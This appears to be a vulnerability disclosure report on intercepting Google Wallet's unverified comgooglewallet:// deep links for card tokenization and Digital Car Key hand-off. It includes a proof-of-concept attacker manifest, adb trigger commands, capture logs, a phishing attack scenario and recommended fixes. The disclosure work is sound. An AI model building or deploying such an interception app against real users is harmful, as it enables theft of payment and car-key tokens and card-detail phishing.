# Google Wallet (GMS) — Card Tokenization & Digital Car Key Deep Link Interception via Unverified `comgooglewallet://` Custom URI Scheme

## Summary

Google Play Services (`com.google.android.gms`) registers multiple BROWSABLE intent filters for the custom URI scheme `comgooglewallet://` that back two highly sensitive Google Wallet flows:

1. **Payment card tokenization continuation** — `comgooglewallet://wallet.google.com/pay/continue_tokenization` (`.tapandpay.tokenization.AddNewCardThroughBrowserActivity`), the callback that resumes adding a payment card to Google Wallet after a browser-based bank verification step.
2. **Digital Car Key (DCK) cross-platform entry point** — `comgooglewallet://wallet.apple.com/v1/m/...` and `comgooglewallet://walletshare.googleapis.com/...` (`.dck.entrypoint.EntryPointDckActivity`), used to hand off / provision a digital car key.

None of these filters are protected by App Link verification (impossible for a custom scheme), so a zero-permission attacker app can register a matching intent filter and intercept the callback via the standard disambiguation chooser.

## Severity: CRITICAL

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select the attacker app from the system chooser
- **CIA impact**: Confidentiality (payment-card tokenization session parameters and digital-car-key provisioning tokens leaked to a zero-permission attacker); Integrity (the tokenization/car-key hand-off is diverted away from the legitimate Wallet flow, which the attacker can then abuse or spoof)

## Affected Components

- **Package**: `com.google.android.gms` (Google Play Services / Google Wallet)
- **Scheme**: `comgooglewallet://`
- **Activities registered for the scheme** (confirmed via `dumpsys package com.google.android.gms`):

| Host / Path | Activity | Purpose |
|---|---|---|
| `wallet.google.com/pay/continue_tokenization` | `com.google.android.gms.tapandpay.tokenization.AddNewCardThroughBrowserActivity` | Resumes payment-card tokenization after browser-based issuer verification |
| `wallet.apple.com`, `wallet.apple.com.cn`, `cert-wallet.apple.com`(`.cn`)`/v1/m` | `com.google.android.gms.dck.entrypoint.EntryPointDckActivity` | Digital Car Key cross-platform hand-off entry point |
| `walletshare.googleapis.com`, `staging-walletshare.sandbox.googleapis.com` | `com.google.android.gms.dck.entrypoint.EntryPointDckActivity` | Digital Car Key / wallet-share provisioning |
| `relay.thinkey-server.com` | `com.google.android.gms.dck.entrypoint.ExternalRelayEntryPointDckActivityAlias` | DCK external relay |

Example filter tested:

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="comgooglewallet"
          android:host="wallet.google.com"
          android:path="/pay/continue_tokenization" />
</intent-filter>
```

**No `android:autoVerify="true"` is present on any of these filters.** Because `comgooglewallet://` is a custom scheme (not `https://`), Digital Asset Links verification cannot protect it regardless of the fact that the host segment names real Google/Apple domains — Android's App Link verification only ever applies to the `http`/`https` scheme.

This is a distinct finding from the previously-reported `pix://` Wallet scheme interception (`VRP_SUBMISSION_WALLET_DEEPLINK`) — `comgooglewallet://` is a different scheme, different activities, and covers different (tokenization/DCK) flows.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="comgooglewallet"
              android:host="wallet.google.com"
              android:pathPrefix="/pay/continue_tokenization" />
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="comgooglewallet"
              android:host="wallet.apple.com"
              android:pathPrefix="/v1/m" />
    </intent-filter>
</activity>
```

### Reproduction Steps — Card Tokenization

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Trigger the tokenization callback (as the issuing bank's verification browser page would, at the end of the "add card to Wallet" flow):
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "comgooglewallet://wallet.google.com/pay/continue_tokenization?session=ABC123"
   ```
3. Android displays an "Open with ZeroPerm" chooser.
4. If the user confirms, the tokenization session parameter is captured by the zero-permission attacker.

### Reproduction Steps — Digital Car Key

1. Trigger the DCK hand-off callback:
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "comgooglewallet://wallet.apple.com/v1/m/carkey?token=DCK123"
   ```
2. Android displays an "Open with ZeroPerm" chooser.
3. If the user confirms, the car-key provisioning token is captured by the zero-permission attacker.

### Runtime Proof

Foreground activity confirms the system chooser is actually shown (not silently routed to GMS):

```
topResumedActivity=ActivityRecord{... android/com.android.internal.app.ResolverActivity ...}
```

logcat — tokenization:

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: comgooglewallet://wallet.google.com/pay/continue_tokenization?session=ABC123
W OAUTH_INTERCEPT: [+] Param: session = ABC123
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

logcat — Digital Car Key:

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: comgooglewallet://wallet.apple.com/v1/m/carkey?token=DCK123
W OAUTH_INTERCEPT: [+] Param: token = DCK123
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

## Impact

### Confidentiality
- **Tokenization session hijack**: `continue_tokenization` carries the session state that ties a bank's card-verification result back to the Wallet card-provisioning flow. A zero-permission attacker capturing this session parameter learns sensitive card-provisioning session metadata and can prevent the legitimate Wallet app from ever completing card add — while presenting a spoofed "Google Wallet" UI to phish the card details directly instead.
- **Digital Car Key token exposure**: `wallet.apple.com/v1/m/...` and `walletshare.googleapis.com` callbacks carry the token used to complete a car-key transfer/provisioning handshake. A zero-permission attacker intercepting this token can disrupt the hand-off and potentially replay or relay the captured token toward its own spoofed continuation flow.

### Integrity
- **Flow hijack / denial of provisioning**: In both flows, once the attacker's activity consumes the callback intent, the legitimate GMS activity never receives it — the card-add or car-key hand-off silently fails from the user's perspective while the attacker now controls the callback data and can show a convincing spoofed continuation screen to extract further payment or vehicle-access information from the user.

## Attack Scenario

1. User initiates "Add card to Google Wallet"; the issuing bank's verification web page redirects back via `comgooglewallet://wallet.google.com/pay/continue_tokenization?session=...` to resume provisioning in Wallet.
2. The attacker's zero-permission app (e.g., a free flashlight or game) is already installed.
3. The chooser appears; if the user selects/confirms the attacker app (or is socially engineered to, e.g. by the attacker setting a convincing app name/icon), the session token is captured and card provisioning is disrupted — the attacker can then present a fake "verify your card" screen to phish the full card number, CVV, and billing details.
4. The identical pattern applies to a Digital Car Key transfer initiated from an Apple Wallet or a car OEM app.

## Recommended Fix

1. Migrate all `comgooglewallet://` callback flows to verified `https://` App Links with `autoVerify="true"` and Digital Asset Links, since real domains (`wallet.google.com`, `walletshare.googleapis.com`) are already used as the host component — these should be genuine `https://` URLs, not a custom scheme with a domain-shaped host.
2. Validate the caller with `Activity.getCallingPackage()` / `Activity.getReferrer()` before processing the tokenization or DCK callback.
3. Bind the callback to a short-lived, single-use, cryptographically unguessable session token that is invalidated immediately after first consumption, so a raced interception cannot be replayed.

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.55)
- `screen_tokenization_chooser.png` — Chooser showing ZeroPerm alongside the legitimate handler for `continue_tokenization`
- `screen_tokenization_data_capture.png` — ZeroPerm displaying captured tokenization session data
- `screen_dck_chooser.png` — Chooser showing ZeroPerm alongside the legitimate handler for the DCK entry point
- `screen_dck_data_capture.png` — ZeroPerm displaying captured Digital Car Key token data
